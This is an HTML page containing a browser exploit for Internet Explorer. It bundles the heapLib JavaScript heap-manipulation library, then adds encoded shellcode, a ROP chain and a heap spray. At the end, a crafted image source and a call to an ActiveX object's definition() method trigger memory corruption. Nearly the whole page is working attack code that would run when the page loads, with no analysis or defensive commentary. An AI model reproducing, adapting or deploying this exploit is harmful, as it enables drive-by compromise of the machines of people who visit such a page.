    <html>
    <head>
    <script>
    //
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    // Allocate a padding string that uses maxAlloc bytes
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    // Create an array for storing references to allocated memory
    this.mem = new Array();

    // Call flushOleaut32() once to allocate the maximum size blocks
    this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    // Create an array for this tag if doesn't already exist
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        // Allocate a new block with strdup of the string argument
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        // Allocate the block
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    // Run the garbage collector
    CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    // Free the maximum size blocks and push out all smaller blocks

    this.freeOleaut32("oleaut32");
    
    // Allocate the maximum sized blocks again, emptying the cache

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    // Allocate the block with the OLEAUT32 allocator
    this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

    // Free the blocks with the OLEAUT32 free function
    this.freeOleaut32(tag);

    // Flush the OLEAUT32 cache
    this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
    // structure for each block size + header size in 8 byte increments.

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    // Make sure the size is valid
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    // Build the fake vtable that will go on the lookaside list
    //
    // lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
    // 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

    var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    // If the vtable is the only entry on the lookaside, the first 4 bytes will
    // be 00 00 00 00, which disassembles as two add [eax], al instructions.
    // The jmp ecx trampoline will jump back to the beginning of the vtable and
    // execute the add [eax], al instructions. We need to use two sub [eax], al
    // instructions to fix the heap.

    vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}


    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("%u249b%ub4b8%u7c99%u273f%ue28c%u4966%u037e%uc1c7%u75e2%u747d%u7378%u1576%u98b4%u4870%u46b3%u117a%u24eb%u403c%u37a9%u6b4f%u91fc%ub5b1%u2cbe%ufe1b%ue1c0%u2d79%u9914%u388d%u41fd%u47bf%u4e72%u9367%u1d7c%u0c04%ud428%uba90%u9bb2%uf523%u3ab9%u7be3%u3f27%u9f92%u353d%uf821%ud631%ubb49%u3496%u972f%ud512%u0d4a%u4bb0%u43b6%u711c%u6677%u15a8%u8642%u7fe0%uf913%u05b8%u77b7%ue119%ub925%ud369%uf8d2%ub340%u2035%u7de2%ud430%u79b6%u7a0c%u9866%u0473%u999f%u43ba%ub4a9%u7b76%u4847%u3424%u74b1%ub805%u7827%u2d1c%ub725%uf929%ua890%u4275%u144a%u81bb%uc6ff%ufdc0%u2bbf%ud1d3%u3fe3%u4e3c%ub067%ube1d%u239b%u92f5%ud033%u71e0%u7e15%u7f4f%u2049%u37eb%u97b2%u8d41%u934b%u0d7c%u3d2f%u7246%ufc28%u962c%u1870%u91d6%u7db5%u7970%u757b%uf629%u85d5%u7ae3%ua815%ue289%uf921%u2a92%u76e1%u7c46%u7271%u9667%u487e%uba99%ua93c%u8d40%u93b8%ube9b%u43b5%u47b7%u05b3%ufd1b%u744e%u1c34%ub097%u4f49%uf812%u8798%ud6c1%ub4b2%u4241%u140d%uf513%u4bb6%u3577%u8391%u90fc%u9f37%ud51a%u2d25%u31bf%u3feb%u66bb%u731d%ue039%u240c%u2c27%u7f4a%u6b3d%u2fd4%ub104%u78b9%ufd3a%ub199%u3c04%u7974%ueb38%u377c%ufc03%u0575%u15ba%u7776%u8c40%u7be1%ue202%u9327%u664e%u7f4f%u427a%u71b2%u677d%u9834%u19b4%u2fe0%ue310%u4672%ud484%u0c78%u7073%u417e%ubb14%u923d%ud588%u8db3%u24b7%u1db9%u9f25%ub535%u432c%ubfb6%ub891%u11be%u2dd6%u1c47%u9749%u7996%u7370%ub04a%u3f7c%u3278%u48e1%u3b75%u77f9%uf701%uf8d2%u7490%u9b4b%u71a9%ue209%uf530%u81a8%u08eb%u0de0%u2476%u2272%ub2d5%u417f%u7e90%u3c37%ubfb5%u047a%u057b%u67fd%ub793%ub4a9%ub166%u2f7d%u8025%ub8f8%u9297%u9b2d%u4b43%u0c99%u149f%u4e40%u4f35%uf569%ub64a%ud6b9%ub0ba%u8648%u42f9%ud40b%u1d46%u4996%ue3a8%ufc0a%ube34%ubb0d%u153d%u3f8d%u1c2c%u27b3%u4798%uda91%ub8c9%u4e20%u8333%u74d9%uf424%u2b5b%ub1c9%u8373%ufceb%u4331%u0313%u5d63%u76d1%u899f%u799c%u4a5f%uf0ff%u7bba%u662d%u2ecf%uece1%uc29d%ua18a%u5035%u6dfe%ud13a%u4bb5%ue275%u547b%u20d9%u281d%u7523%u11fd%u88ec%u56fc%u6210%u0fac%ud15f%u3b41%uea1d%ueb60%u522a%u8e1b%u27ec%u9191%u973c%udaae%u93a4%ufae9%u70d5%uc7ea%ufd9c%ubcd9%ud41f%u3c13%u182e%u03ff%u959f%u4301%u4627%ubf74%ufb54%u048f%u2727%u9905%uac8f%u79bd%u602e%u095b%ucd3c%u552f%ud020%uedfc%u595c%u2203%u19d5%ue620%ufabe%ubf49%uac1a%udf76%u11c2%uabd3%u46e0%uf665%uf76c%u7d0f%u6f6c%u14a7%u0602%u01ce%ub08e%uba9c%u4608%u90e2%ub765%u4c4b%u10d2%u1a22%uc8e6%u7db3%u20e9%ue2a8%ufa4e%ub2e6%u9621%u65fb%u0c90%ud6ac%ub942%u501b%ufffd%ub75b%u4fea%u09fd%u1d3e%u6995%uc28c%u38e1%u50a2%ueebb%u3d12%u5ad0%u86bc%ub0d9%u3e49%u2b4f%ud712%u7810%u27a4%u9f98%u23ce%u35ca%u7a11%ubc82%u1c6b%uc0d4%u11a6%u6926%u051f%uc08f%u84f7%uf529%u287c%u80e0%ua342%uc024%uc84d%ud6b7%ud051%u072c%u4db8%ua8b2%u863a%u571f%ua9c5%ud94f%u794f%u36e5%uabc3%u2175%u8b6b%ud906%u84e4%u768e%u1f88%ub422%u9301%uabc4%u53b5%u5fde%u9474%uf07f%u161c%uf2ea%u7cb0%u98e8%ud632%u8684%u02c4%uc81b%u20fd%uf695%ufe9b%uf5d2%u3b4a%u748e%ue7c0%ub627%u5318%ue834%ucac9%u1a53%u7b7f%ue541%uf9aa%u6e46%u5a79%u4fc2%u4cf5%u4fa6%u20a1%u14bb%ucd6d%uc793%ue005%u4644%u058e%u15bf%ufedc%ud4ab%u974f%u7fed%u35e8%uaa0d%ub99c%u3da6%u3151%u3927%u906e%u45d2%ufbf8%u6c3e%u04f2%u9895%u0492%ua6e9%u89ff%u2c6e%u43ce%ub6ea%u9c55%ubf1c%u636b%u2a23%ufde0%ud2af%u9d68%u4c61%u071a%u8e11");
    var nops = unescape("%u0c0c%u0c0c");
    var nops_90 = unescape("%u4f9b%u9f46");
    var rop_chain = unescape("%uec01%u77c4%uec00%u77c4%u5ed5%u77c1%uec01%u77c4%uec01%u77c4%uec01%u77c4%uec01%u77c4%ub860%u77c3%uffff%uffff%ube18%u77c1%u1fb4%u031e%u362c%u77c2%ud9bb%u77c5%ue071%u77c2%u0d13%u77c5%uffc0%uffff%u8fbc%u77c5%ube18%u77c1%u8820%ud90b%u8fbc%u77c5%uee15%u77c3%uee15%u77c3%ueeef%u77c3%ud9bb%u77c5%ua88c%u77c2%u9f92%u77c3%ua184%u77c3%uaacc%u77c2%ub860%u77c3%u1120%u77c1%u2df9%u77c1%u5459%u77c3");

    while (nops.length < 0x80000) nops += nops;
    while (nops_90.length < 0x80000) nops_90 += nops_90;

    var offset = nops.substring(0, 0x0);
    var nops_padding = nops.substring(0, 0x5f4-code.length-offset.length);
    var shellcode = offset + code + nops_padding + rop_chain + nops_90.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);


    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);


    heap_obj.gc();
    for (var z=1; z < 0x230; z++) {
      heap_obj.alloc(block);
    }


    </script>
    </head>
    <body>
    <object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="WWRw"></object>
    <script>
    var obj = document.getElementById('WWRw').object;
    var src = unescape("%u0c08%u0c0c");
    while (src.length < 0x1002) src += src;
    src = "\\\\xxx" + src;
    src = src.substr(0, 0x1000 - 10);
    var pic = document.createElement("img");
    pic.src = src;
    pic.nameProp;
    obj.definition(28);
    </script>
    </body>
    </html>
